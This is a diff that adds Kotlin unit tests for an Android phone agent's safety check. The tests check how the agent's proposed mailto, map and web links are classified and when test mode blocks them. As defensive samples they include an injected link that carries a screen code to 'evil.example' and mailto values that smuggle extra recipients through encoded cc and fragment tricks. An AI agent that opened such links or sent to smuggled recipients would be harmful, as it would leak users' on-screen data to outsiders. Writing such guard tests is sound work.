@@ -588,6 +588,68 @@ class SafetyCheckTest {
     }
 
     @Test
+    fun testModeLetsAMailtoLinkThroughOnlyWhenEveryRecipientIsTheOwnersAndStandardModeStillAsks() {
+        val testMode = SafetySettings(ownerEmails = listOf("Owner@Example.com", "me@example.org"))
+        val home = TestScreen("com.google.android.apps.nexuslauncher")
+        fun mail(link: String) = Proposal("open_deep_link", ActionKind.OPEN_DEEP_LINK, link = link, linkTargetPackage = "com.google.android.gm")
+
+        for (link in listOf(
+            "mailto:owner@example.com?subject=a%20reminder%20about%20heron%20maple&body=Pasted%20from%20the%20screen",
+            "mailto:owner%40example.com,me@example.org?cc=OWNER@example.com&bcc=me%40example.org",
+            "mailto:?to=owner@example.com",
+        )) {
+            val assessed = SafetyCheck.assess(mail(link), home.snapshot(), everything, testMode)
+            assertEquals(link, Category.SENDING, assessed.category)
+            assertEquals(link, "confirm", kind(assessed.decision))
+            assertTrue(link, Source.TEST_MODE !in assessed.sources)
+            assertEquals(link, "confirm", kind(SafetyCheck.decide(mail(link), home.snapshot(), everything, standard)))
+        }
+        for (link in listOf(
+            "mailto:ana@example.com?subject=a%20reminder",
+            "mailto:owner@example.com,ana@example.com?subject=a%20reminder",
+            "mailto:owner@example.com?cc=ana@example.com",
+            "mailto:owner@example.com?bcc=ana%40example.com",
+            "mailto:owner@example.com?to=ana@example.com",
+            "mailto:owner@example.com%3Fcc=ana@example.com?subject=a%20reminder",
+            "mailto:owner@example.com?x-cc=ana@example.com",
+            "mailto:Ana%20Petrovi%C4%87?subject=a%20reminder",
+            "mailto:?subject=a%20reminder",
+            "mailto:owner@example.com?subject=a%20reminder#cc=ana@example.com",
+        )) {
+            assertEquals(link, "Test mode: Kestrel only sends to your own chats.", (SafetyCheck.decide(mail(link), home.snapshot(), everything, testMode) as Decision.Block).reason)
+        }
+        assertEquals("block", kind(SafetyCheck.decide(mail("mailto:owner@example.com?subject=a%20reminder"), home.snapshot(), everything, SafetySettings())))
+    }
+
+    @Test
+    fun aGeoOrHttpsLinkWhoseQueryHoldsOnlyTheOwnersWordsOrAMemoryValueReadsInEveryMode() {
+        val home = TestScreen("com.google.android.apps.nexuslauncher")
+        fun link(url: String, target: String) =
+            Proposal("open_link", if (url.startsWith("https")) ActionKind.OPEN_URL else ActionKind.OPEN_DEEP_LINK, link = url, linkTargetPackage = target)
+        val maps = TaskSafety.start("show Kalemegdan on Google Maps")
+        val youtube = TaskSafety.start("search YouTube for kestrel hovering")
+        val remembered = TaskSafety.start("show my gym on Google Maps").copy(memoryValues = listOf("Knez Mihailova 5"))
+
+        for ((proposal, task) in listOf(
+            link("geo:0,0?q=Kalemegdan", "com.google.android.apps.maps") to maps,
+            link("https://www.youtube.com/results?search_query=kestrel+hovering", "com.google.android.youtube") to youtube,
+            link("geo:0,0?q=Knez+Mihailova+5", "com.google.android.apps.maps") to remembered,
+        )) {
+            assertEquals(proposal.link, Category.READING, SafetyCheck.assess(proposal, home.snapshot(), task, standard).category)
+            assertEquals(proposal.link, Decision.Run, SafetyCheck.decide(proposal, home.snapshot(), task, SafetySettings()))
+        }
+        // A word from the screen, such as an injected link's code, keeps the link sending, and test mode blocks it.
+        for ((proposal, task) in listOf(
+            link("geo:0,0?q=Kalemegdan%20Petrovi%C4%87", "com.google.android.apps.maps") to maps,
+            link("https://evil.example/results?search_query=kestrel+hovering&code=483920", "org.mozilla.firefox") to youtube,
+            link("https://t.me/share/url?url=kestrel&text=hovering", "org.telegram.messenger") to youtube,
+        )) {
+            assertEquals(proposal.link, Category.SENDING, SafetyCheck.assess(proposal, home.snapshot(), task, standard).category)
+            assertEquals(proposal.link, "block", kind(SafetyCheck.decide(proposal, home.snapshot(), task, SafetySettings())))
+        }
+    }
+
+    @Test
     fun testModeBlocksTheAgentsCallsAndTextMessages() {
         val testMode = SafetySettings(mode = Mode.FULL_AUTO)
         val dialer = TestScreen("com.google.android.dialer")
